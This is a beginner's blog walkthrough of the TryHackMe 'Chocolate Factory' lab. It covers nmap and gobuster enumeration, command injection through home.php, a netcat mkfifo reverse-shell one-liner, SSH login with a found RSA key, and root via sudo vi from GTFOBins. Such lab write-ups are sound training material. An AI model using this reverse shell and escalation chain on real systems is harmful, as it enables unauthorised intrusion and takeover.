---
layout: post
title: Tryhackme Chocolate Factory Walkthrough 
date: 2017-09-12 00:00:00 +0300
description: You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: titlephoto1.jpg # Add image post (optional)
tags: [Tryhackme, CTF] # add tag
---

Today’s blog post — I will give a walk-through on room called, “Chocolate Factory”. This is perfect practice for Beginners 

Let’s get started.
Firstly Diploy the machine and Wait a minute for get ip address to start.

![init]({{site.baseurl}}/assets/img/cholocate.tryhackme/init.png)

### Enumeration 
 > sudo nmap -sV -sC -v <ip>
   <br />
  -sV: Probe open ports to determine service/version info <br />
  -sC: equivalent to --script=default <br />
   -v: verbose mode <br />
the result like look,<br />

![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/nmap.png)  

There can see ftp running on port 21,ssh running on port 22 and webserver in port 80 Then try Open browser enter ip address default webserver running in port 80 

I trying sqlinjection but nothing changes ,So Check the directories using gobuster 
> gobuser dir -u <ip> -w /usr/share/seclists
  
OK.. Here see home.php <br />
 ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/command.ls.png)  
  try system commands then reverse connection command 
  
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 
 remember one thing  disable your ufw firewall before run the listerning netcat <br />
  listern our system 
  > nc -lvnp  <br />
    -l listen mode, for inbound connects <br />
    -v verbose <br />
    -n numeric-only IP addresses, no DNS <br />
    -p local port number <br />
   ! [reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/reverse2.png) 
   
   use python3 shell for better interaction <br />
   python3 -c 'import pty; pty.spawn("/bin/sh")' <br />
   then list out file and read key
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/cat.key.png)
  
   change the user to charlie <br/>
   /home/charlie and list all files <br />
   found RSA key in this folder called teleport and I copied it to my machine and saved that under the name id_rsa.change permission
   > chmod 600 filename <br />
   login with ssh charlie 
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/sshcharlie.png) <br />
   read the user key <br />
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/userflag.png) <br />
  ### privilege escalation 
  
    check the current user privilege 
    > sudo -l 
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/userprivilege.png)
   get root permission using vi 
   use this website gtfobins.github.io/
   search vi get result 
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/root.png) <br />
   copy the command and paste into terminal 
   Now root user
   change charlie to root 
   su root 
   run the file with key
   DONE 
  
 

